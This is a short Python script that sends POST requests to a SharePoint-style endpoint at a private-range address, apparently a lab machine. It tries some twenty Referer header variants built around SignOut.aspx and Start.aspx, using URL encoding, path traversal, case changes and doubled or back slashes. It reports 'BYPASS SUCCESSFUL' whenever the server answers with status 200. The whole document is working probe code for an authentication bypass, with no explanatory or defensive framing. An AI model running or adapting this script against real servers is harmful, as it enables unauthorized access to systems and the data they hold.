# Test Referer header variations and edge cases
# Purpose: Find all patterns that trigger the auth bypass

import requests

base_url = "http://10.10.10.166"
test_endpoint = "/_layouts/15/Error.aspx"
test_body = "test=data"

# Test various Referer patterns
test_cases = [
    # Different signout paths
    ("Referer: /_layouts/SignOut.aspx", "/_layouts/SignOut.aspx"),
    ("Referer: /_layouts/15/SignOut.aspx", "/_layouts/15/SignOut.aspx"),
    ("Referer: /SignOut.aspx", "/SignOut.aspx"),
    ("Referer: /_layouts/signout.aspx (lowercase)", "/_layouts/signout.aspx"),
    
    # With query strings
    ("Referer: /_layouts/SignOut.aspx?test=1", "/_layouts/SignOut.aspx?test=1"),
    ("Referer: /_layouts/SignOut.aspx#anchor", "/_layouts/SignOut.aspx#anchor"),
    
    # Absolute URLs
    ("Referer: http://10.10.10.166/_layouts/SignOut.aspx", "http://10.10.10.166/_layouts/SignOut.aspx"),
    ("Referer: https://10.10.10.166/_layouts/SignOut.aspx", "https://10.10.10.166/_layouts/SignOut.aspx"),
    
    # Path traversal in referer
    ("Referer: /_layouts/../_layouts/SignOut.aspx", "/_layouts/../_layouts/SignOut.aspx"),
    ("Referer: /_layouts/./SignOut.aspx", "/_layouts/./SignOut.aspx"),
    
    # URL encoding
    ("Referer: /%5Flayouts/SignOut.aspx (_layouts encoded)", "/%5Flayouts/SignOut.aspx"),
    ("Referer: /_layouts/SignOut%2Easpx (.aspx encoded)", "/_layouts/SignOut%2Easpx"),
    
    # Trailing slashes
    ("Referer: /_layouts/SignOut.aspx/", "/_layouts/SignOut.aspx/"),
    
    # Double slashes
    ("Referer: /_layouts//SignOut.aspx", "/_layouts//SignOut.aspx"),
    
    # Backslashes (Windows path)
    ("Referer: /_layouts\\SignOut.aspx", "/_layouts\\SignOut.aspx"),
    
    # Empty and special values
    ("Referer: (empty string)", ""),
    ("Referer: /", "/"),
    
    # Start page (from code analysis)
    ("Referer: /_layouts/Start.aspx", "/_layouts/Start.aspx"),
    ("Referer: /_layouts/15/Start.aspx", "/_layouts/15/Start.aspx"),
]

for name, referer_value in test_cases:
    print(f"\n[*] Test: {name}")
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if referer_value:  # Only add if not empty
        headers["Referer"] = referer_value
    
    try:
        response = requests.post(f"{base_url}{test_endpoint}", headers=headers, data=test_body, timeout=10)
        print(f"    Status: {response.status_code}")
        if response.status_code == 200:
            print(f"    *** BYPASS SUCCESSFUL ***")
    except Exception as e:
        print(f"    Error: {e}")
